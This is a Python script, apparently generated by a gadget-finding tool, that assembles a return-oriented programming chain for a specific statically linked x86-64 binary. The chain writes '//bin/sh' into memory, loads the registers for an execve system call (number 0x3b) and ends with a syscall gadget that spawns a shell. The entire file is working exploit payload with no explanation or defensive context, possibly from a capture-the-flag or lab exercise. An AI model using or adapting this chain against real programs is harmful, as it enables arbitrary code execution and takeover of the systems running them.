from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 82679ba0823db445832fdf4e7e300acc050f694d2c0de881a979163c399c8d77
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0000000000005b68) # 0x0000000000405b68: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x0000000000001696) # 0x0000000000401696: pop rdi; ret; 
rop += rebase_0(0x00000000002ca080)
rop += rebase_0(0x000000000005cc25) # 0x000000000045cc25: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000005b68) # 0x0000000000405b68: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000001696) # 0x0000000000401696: pop rdi; ret; 
rop += rebase_0(0x00000000002ca088)
rop += rebase_0(0x000000000005cc25) # 0x000000000045cc25: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
# Filled registers: rdi, rsi, rdx, 
rop += rebase_0(0x0000000000001696) # 0x0000000000401696: pop rdi; ret; 
rop += rebase_0(0x00000000002ca080)
rop += rebase_0(0x00000000000017b7) # 0x00000000004017b7: pop rsi; ret; 
rop += rebase_0(0x00000000002ca088)
rop += rebase_0(0x0000000000042e46) # 0x0000000000442e46: pop rdx; ret; 
rop += rebase_0(0x00000000002ca088)
rop += rebase_0(0x0000000000001696) # 0x0000000000401696: pop rdi; ret; 
rop += rebase_0(0x00000000002ca080)
rop += rebase_0(0x00000000000017b7) # 0x00000000004017b7: pop rsi; ret; 
rop += rebase_0(0x00000000002ca088)
rop += rebase_0(0x0000000000080956) # 0x0000000000480956: pop rax; pop rdx; pop rbx; ret; 
rop += p(0x000000000000003b)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000042e46) # 0x0000000000442e46: pop rdx; ret; 
rop += rebase_0(0x00000000002ca088)
rop += rebase_0(0x000000000006f785) # 0x000000000046f785: syscall; ret; 
